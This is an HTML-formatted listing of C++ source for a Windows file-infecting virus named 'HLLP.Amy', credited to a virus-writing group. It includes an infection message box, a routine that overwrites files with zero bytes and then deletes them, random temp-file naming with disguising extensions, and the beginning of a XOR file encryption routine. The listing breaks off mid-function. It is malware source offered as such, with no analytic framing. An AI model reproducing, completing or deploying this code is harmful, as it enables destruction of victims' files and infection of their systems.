<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Win32.HLLP.Amy - amy.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">AMY</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"HLLP.Amy by Byt3Cr0w/GEDZAC - Thnx to Amy Lee from Evanescence for inspired me in sad-bad moments..."</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ID</span><span class="sc10">,</span><span class="sc11">MSize</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">thread1</span><span class="sc10">,</span><span class="sc11">thread2</span><span class="sc10">,</span><span class="sc11">thread3</span><span class="sc10">,</span><span class="sc11">thread4</span><span class="sc10">,</span><span class="sc11">thread5</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">ThReAd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">c0unt</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">c0unt_</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">MyBuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">VxDfile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">SeekTarget</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MyPath</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FileEnc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">MeatBuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FileToDelete</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">VxD</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Meat</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Amy</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmpfol</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">actual</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">windirx</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">MContent</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Func</span><span class="sc10">)(</span><span class="sc16">long</span><span class="sc10">,</span><span class="sc11">LPCTSTR</span><span class="sc10">,</span><span class="sc11">LPCTSTR</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">long</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">AmySize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">48573</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">AmyName</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">Arg</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">MzG</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"[-You H4z Been !nfect3d by HLLP.Amy.A-]"</span><span class="sc10">,</span><span class="sc6">"...::-Amy.A by Byt3Cr0w/GEDZAC-::..."</span><span class="sc10">,</span><span class="sc4">32</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">DameSize</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">meat</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">meat</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">meat</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getc</span><span class="sc10">(</span><span class="sc11">meat</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EOF</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc11">bytes</span><span class="sc10">++;}</span><span class="sc0">
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">meat</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">NATO</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">FileToDelete</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">TargetFile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">z</span><span class="sc10">,</span><span class="sc11">x</span><span class="sc10">,</span><span class="sc11">Data</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">Data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x00</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">x</span><span class="sc10">&lt;</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc11">x</span><span class="sc10">++)</span><span class="sc0">
 </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">==</span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">DameSize</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">TargetFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wb"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TargetFile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">z</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">z</span><span class="sc10">&lt;</span><span class="sc11">Size</span><span class="sc10">;</span><span class="sc11">z</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">putc</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">,</span><span class="sc11">TargetFile</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">TargetFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Delete_</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc10">[],</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">wait</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">FileToDelete</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ThReAd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">NATO</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc11">ThReAd</span><span class="sc10">,</span><span class="sc11">THREAD_PRIORITY_TIME_CRITICAL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wait</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">ThReAd</span><span class="sc10">,</span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">ThReAd</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">range</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">range</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">RandomStr</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">range</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temporal</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ABC</span><span class="sc10">[</span><span class="sc4">54</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc7">'Q'</span><span class="sc10">,</span><span class="sc7">'W'</span><span class="sc10">,</span><span class="sc7">'E'</span><span class="sc10">,</span><span class="sc7">'R'</span><span class="sc10">,</span><span class="sc7">'T'</span><span class="sc10">,</span><span class="sc7">'Y'</span><span class="sc10">,</span><span class="sc7">'U'</span><span class="sc10">,</span><span class="sc7">'I'</span><span class="sc10">,</span><span class="sc7">'O'</span><span class="sc10">,</span><span class="sc7">'P'</span><span class="sc10">,</span><span class="sc7">'A'</span><span class="sc10">,</span><span class="sc7">'S'</span><span class="sc10">,</span><span class="sc7">'D'</span><span class="sc10">,</span><span class="sc7">'F'</span><span class="sc10">,</span><span class="sc7">'G'</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc7">'H'</span><span class="sc10">,</span><span class="sc7">'J'</span><span class="sc10">,</span><span class="sc7">'K'</span><span class="sc10">,</span><span class="sc7">'L'</span><span class="sc10">,</span><span class="sc7">'Z'</span><span class="sc10">,</span><span class="sc7">'X'</span><span class="sc10">,</span><span class="sc7">'C'</span><span class="sc10">,</span><span class="sc7">'V'</span><span class="sc10">,</span><span class="sc7">'B'</span><span class="sc10">,</span><span class="sc7">'N'</span><span class="sc10">,</span><span class="sc7">'M'</span><span class="sc10">,</span><span class="sc7">'q'</span><span class="sc10">,</span><span class="sc7">'w'</span><span class="sc10">,</span><span class="sc7">'e'</span><span class="sc10">,</span><span class="sc7">'r'</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc7">'y'</span><span class="sc10">,</span><span class="sc7">'u'</span><span class="sc10">,</span><span class="sc7">'i'</span><span class="sc10">,</span><span class="sc7">'o'</span><span class="sc10">,</span><span class="sc7">'p'</span><span class="sc10">,</span><span class="sc7">'a'</span><span class="sc10">,</span><span class="sc7">'s'</span><span class="sc10">,</span><span class="sc7">'d'</span><span class="sc10">,</span><span class="sc7">'f'</span><span class="sc10">,</span><span class="sc7">'g'</span><span class="sc10">,</span><span class="sc7">'h'</span><span class="sc10">,</span><span class="sc7">'j'</span><span class="sc10">,</span><span class="sc7">'k'</span><span class="sc10">,</span><span class="sc7">'l'</span><span class="sc10">,</span><span class="sc7">'z'</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc7">'x'</span><span class="sc10">,</span><span class="sc7">'c'</span><span class="sc10">,</span><span class="sc7">'v'</span><span class="sc10">,</span><span class="sc7">'b'</span><span class="sc10">,</span><span class="sc7">'n'</span><span class="sc10">,</span><span class="sc7">'m'</span><span class="sc10">};</span><span class="sc0">

                          </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">range</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">temporal</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ABC</span><span class="sc10">[</span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc4">54</span><span class="sc10">)];</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                          </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">final</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
                          </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">final</span><span class="sc10">,</span><span class="sc11">temporal</span><span class="sc10">);</span><span class="sc0">
                          </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">final</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">RandomExt</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
      </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Extx</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">".tmp"</span><span class="sc10">,</span><span class="sc6">".vxd"</span><span class="sc10">,</span><span class="sc6">".dat"</span><span class="sc10">,</span><span class="sc6">".dll"</span><span class="sc10">,</span><span class="sc6">".ged"</span><span class="sc10">};</span><span class="sc0">
      </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">final</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
      </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">final</span><span class="sc10">,</span><span class="sc11">Extx</span><span class="sc10">[</span><span class="sc11">X</span><span class="sc10">]);</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">final</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">GenerateName</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">final</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">tmpfol</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">RandomStr</span><span class="sc10">(</span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc4">30</span><span class="sc10">)));</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">RandomExt</span><span class="sc10">());</span><span class="sc0">
   </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">final</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">final</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">EcDec</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">mode</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">in</span><span class="sc10">,*</span><span class="sc11">out</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">OutputFile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">,</span><span class="sc11">bytes</span><span class="sc10">,</span><span class="sc11">key</span><span class="sc10">,</span><span class="sc11">Dec</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">OutputFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GenerateName</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">            
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">OutputFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wb"</span><span class="sc10">);</span><span class="sc0"> 
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

       </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getc</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EOF</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">     
           </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mode</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//Encrypt
</span><span class="sc0">           </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc10">}</span><span class="sc0">
           </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mode</span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//Decrypt
</span><span class="sc0">           </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc10">}</span><span class="sc0">
           </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">==</span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Dec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
           </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Dec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
